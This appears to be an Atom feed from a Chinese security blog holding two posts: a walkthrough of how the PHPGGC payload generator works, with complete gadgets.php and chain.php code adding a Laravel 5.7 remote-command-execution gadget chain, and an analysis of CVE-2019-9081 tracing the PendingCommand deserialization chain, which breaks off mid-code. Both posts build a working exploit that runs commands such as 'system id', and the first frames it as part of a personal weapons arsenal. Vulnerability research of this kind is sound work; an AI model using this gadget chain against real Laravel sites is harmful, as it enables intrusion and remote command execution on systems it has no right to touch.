<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2019-08-02T04:06:01.128Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpggc详解</title>
    <link href="http://skysec.top/2019/08/02/phpggc%E8%AF%A6%E8%A7%A3/"/>
    <id>http://skysec.top/2019/08/02/phpggc详解/</id>
    <published>2019-08-02T01:00:51.000Z</published>
    <updated>2019-08-02T04:06:01.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHPGGC 是一款能够自动生成主流框架的序列化测试payload的工具，类似 Java 中的 ysoserial，支持大量主流框架的序列化exp一键生成。<br>但因为工具作者的时间有限，不能做到实时更新。而本文旨在分析phpggc原理，并为其添加拓展，以便我们加入最新的，自己需要的exp生成模块。</p><h2 id="phpggc流程分析"><a href="#phpggc流程分析" class="headerlink" title="phpggc流程分析"></a>phpggc流程分析</h2><p>当我们运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc Laravel/RCE1 system id</span><br></pre></td></tr></table></figure></p><p>我们跟踪一下具体流程。</p><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><p><img src="/images/2019-08-02-09-01-27.png" alt=""><br>在创建对象时，我们下断点，发现首先程序会进行load_gadget_chains():<br><img src="/images/2019-08-02-09-07-02.png" alt=""><br>紧接着程序会寻找定义申明过的class:<br><img src="/images/2019-08-02-09-10-20.png" alt=""><br><img src="/images/2019-08-02-09-11-29.png" alt=""><br>经过array_filter，将程序自己构造的gadget取出：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$classes = array_filter($classes, <span class="function"><span class="keyword">function</span><span class="params">($class)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_subclass_of($class, <span class="string">'\\PHPGGC\\GadgetChain'</span>) &amp;&amp;</span><br><span class="line">                   strpos($class, <span class="string">'GadgetChain\\'</span>) === <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-14-33.png" alt=""><br>然后是取出模块名：<br><img src="/images/2019-08-02-09-15-49.png" alt=""><br>我们跟进get_name()，就可以发现，例如：<code>GadgetChain\ZendFramework\FD1</code>经过处理会变成<code>ZendFramework/FD1</code>:<br><img src="/images/2019-08-02-09-17-48.png" alt=""><br>然后将模块名与类申明形成映射关系：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gcs = array_combine($names, $classes);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-19-59.png" alt=""><br>至此为止，初始化过程完成。</p><h3 id="exp生成"><a href="#exp生成" class="headerlink" title="exp生成"></a>exp生成</h3><p>然后初始化完成后，我们成功创建了PHPGGC对象x，然后调用其generate方法进行exp生成：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x-&gt;generate();</span><br></pre></td></tr></table></figure></p><p>首先是从我们的cmdline获取脚本运行参数，并将其解析：<br><img src="/images/2019-08-02-09-21-47.png" alt=""><br>例如我们此时解析出的参数：<br><img src="/images/2019-08-02-09-22-25.png" alt=""><br>同时如果发现我们没有input参数，就会友好性的打出help界面。<br>然后代码就会来到gadget chain的获取：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gc = <span class="keyword">$this</span>-&gt;get_gadget_chain($class);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-02-09-24-44.png" alt=""><br>这里就用到了之前的模块名和类名的映射关系，通过我们传入的模块名迅速找到已申明的类。<br>然后在需要时，再将其包含进来：<br><img src="/images/2019-08-02-09-25-57.png" alt=""><br>我们跟进该函数：<br><img src="/images/2019-08-02-09-26-19.png" alt=""><br>根据命名规则，程序会在其目录gadgetchains下寻找对应文件夹，例如我们对应的目录为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpggc/gadgetchains/Laravel/RCE/1</span><br></pre></td></tr></table></figure></p><p>然后获取其目录下的gadgets.php，拿到对应的类的定义。<br>然后就是利用我们定义的chain.php构造序列化了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$parameters = <span class="keyword">$this</span>-&gt;get_type_parameters($gc, $parameters);</span><br><span class="line">$generated = <span class="keyword">$this</span>-&gt;serialize($gc, $parameters);</span><br></pre></td></tr></table></figure></p><p>首先程序会拿出我们传进去的参数，然后在chain.php中生成序列化的时候使用：<br><img src="/images/2019-08-02-09-35-30.png" alt=""><br>我们关注一下chain.php：<br><img src="/images/2019-08-02-09-35-57.png" alt=""><br>例如我们使用的Laravel/RCE1的chain.php，其中的函数名和参数名都是靠我们传入的。<br>这样便能达成生成指定命令执行的序列化构造的目的。<br><img src="/images/2019-08-02-09-37-30.png" alt=""><br>最后程序会将我们的结果输出。</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>因为phpggc具有很好的拓展性，我们可以将现有已知的exp集成加入，这里就以之前很火的Laravel反序列化RCE为例：<br>phpggc本身提供了新建命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc --new Laravel RCE</span><br></pre></td></tr></table></figure></p><p>运行后phpggc会按规则自动生成如下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpggc/gadgetchains/Laravel/RCE/5</span><br></pre></td></tr></table></figure></p><p>我们按照规则构造gadgets.php和chain.php：<br>gadgets.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line"><span class="keyword">protected</span> $parameters;</span><br><span class="line"><span class="keyword">protected</span> $app;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line"><span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>chain.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Laravel</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE5</span> <span class="keyword">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">RCE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $version = <span class="string">'5.7'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'sky'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    $function = $parameters[<span class="string">'function'</span>];</span><br><span class="line">        $parameter = $parameters[<span class="string">'parameter'</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> \Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">$function,</span><br><span class="line"><span class="keyword">array</span>($parameter),</span><br><span class="line"><span class="keyword">new</span> \Illuminate\Auth\GenericUser(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>))</span><br><span class="line">),</span><br><span class="line"><span class="keyword">new</span> \Illuminate\Foundation\Application(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>))</span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们运行起来，可以看到在模块和类的映射关系中，已经有了我们的RCE5：<br><img src="/images/2019-08-02-09-47-01.png" alt=""><br>运行一下，即可直接拿到exp：<br><img src="/images/2019-08-02-11-30-03.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>phpggc提供非常好的可拓展性，我们可以按此将其打造成自己专属的武器库，实战遇到再也不怕手忙脚乱啦！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;PHPGGC 是一款能够自动生成主流框架的序列化测试payload的工具，类似 Java 中的 ysoserial，支持大量主流框架的序列化
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-9081:Laravel Deserialization RCE Vulnerability</title>
    <link href="http://skysec.top/2019/07/22/CVE-2019-9081-Laravel-Deserialization-RCE-Vulnerability/"/>
    <id>http://skysec.top/2019/07/22/CVE-2019-9081-Laravel-Deserialization-RCE-Vulnerability/</id>
    <published>2019-07-22T13:47:39.000Z</published>
    <updated>2019-07-22T13:50:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="laravel序列化"><a href="#laravel序列化" class="headerlink" title="laravel序列化"></a>laravel序列化</h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)，若其本身出现漏洞，则对使用响应框架开发的网站影响是致命的。而这里就将分析laravel框架序列化RCE，CVE编号：CVE-2019-9081，受影响范围：laravel &gt;= 5.7。</p><h2 id="类名加载"><a href="#类名加载" class="headerlink" title="类名加载"></a>类名加载</h2><p>我们首先随便构造一段序列化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $sky=<span class="string">'test'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sky = <span class="keyword">new</span> sky();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sky));</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A3%3A%22sky%22%3A1%3A%7Bs%3A3%3A%22sky%22%3Bs%3A4%3A%22test%22%3B%7D</span></span><br></pre></td></tr></table></figure></p><p>我们传入laravel，并进行反序列化，可以看到load方法试图加载我们随便输入的sky类，首先在$facadeNamespace中寻找指定类名：<br><img src="/images/2019-07-18-16-14-05.png" alt=""><br><img src="/images/2019-07-18-16-14-16.png" alt=""><br>如果找到，则会通过loadFacade进行加载，否则则进入loadClass进行class map查找，在vendor目录下寻找所需类：<br><img src="/images/2019-07-18-16-04-45.png" alt=""><br><img src="/images/2019-07-18-16-18-25.png" alt=""><br>但是并不能找到sky类，最后会return false。<br>最后查看是否class名以Swift_开头：<br><img src="/images/2019-07-18-16-06-04.png" alt=""><br>最后因为找不到对应类的定义，所以并不能成功进入反序列化流程。<br>但如果我们用一个存在的类，可以明显发现在findFile函数的classMap中找到了相关类，并返回进行了include：<br><img src="/images/2019-07-18-16-35-36.png" alt=""><br><img src="/images/2019-07-18-16-36-22.png" alt=""></p><h2 id="危险类挖掘"><a href="#危险类挖掘" class="headerlink" title="危险类挖掘"></a>危险类挖掘</h2><p>挖掘一个框架的新漏洞，从框架新加入的代码入手是一个很好的思路。我们注意到laravel在5.7之后加入了PendingCommand:<br><img src="/images/2019-07-18-16-44-20.png" alt=""><br>值得注意的是，我们查到该文件，其定义了PendingCommand类，同时注意到其两个方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非常有意思的是，该类有魔法方法__destruct，而该魔法方法会调用run函数，而run函数可以进行执行命令。<br>我们查看其构造方式:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>一共需要用到4个属性，我们查阅对应手册：<br><img src="/images/2019-07-18-19-03-19.png" alt=""></p><h2 id="run-amp-mockConsoleOutput"><a href="#run-amp-mockConsoleOutput" class="headerlink" title="run &amp; mockConsoleOutput"></a>run &amp; mockConsoleOutput</h2><p>我们跟进run方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode, $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>关注到第一个关键点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br></pre></td></tr></table></figure></p><p>我们跟进该函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">                &#125;))</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $mock;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先是第一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [</span><br><span class="line">            (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure></p><p>我们跟进createABufferedOutputMock:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">                -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">                -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">            $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">                -&gt;once()</span><br><span class="line">                -&gt;ordered()</span><br><span class="line">                -&gt;with($output, Mockery::any())</span><br><span class="line">                -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里如果想继续走下去，我们需要属性$this-&gt;test-&gt;expectedOutput<br><img src="/images/2019-07-18-17-12-55.png" alt=""><br>那么有没有类有expectedOutput呢？我们全局搜索，发现在Illuminate\Foundation\Testing\Concerns中存在这样的属性。<br>但这样的类很难被实例化，无法走通后面的路。但此时我们可以巧用魔法方法<strong>get：当我们试图获取一个不可达属性，类会自动调用</strong>get函数。<br>我们找到如下类：<br>vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php<br><img src="/images/2019-07-18-17-13-51.png" alt=""><br>可以使用我们经常使用的小trick，设置键名为expectedOutput的数组，即可利用。<br>然后是第二步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question)</span><br></pre></td></tr></table></figure></p><p>此处依旧可以使用__get方法，定义键名为expectedQuestions的数组即可。</p><h2 id="run-amp-实例化对象"><a href="#run-amp-实例化对象" class="headerlink" title="run &amp; 实例化对象"></a>run &amp; 实例化对象</h2><p>到此为止，我们已经能构造出PendingCommand前3个参数的值了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">                <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">         )</span><br><span class="line">);</span><br><span class="line">$command = <span class="string">"system"</span>;</span><br><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure></p><p>那么最后一个参数$app同样尤为关键，我们继续跟进run的代码，来到关键第三步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br></pre></td></tr></table></figure></p><p>我们跟入这一句，可以发现，首先代码在实例化对象：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app[Kernel::class]</span><br></pre></td></tr></table></figure></p><p>然后再去调对应的call方法，那么跟入不难发现，其想要实例化的对象是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 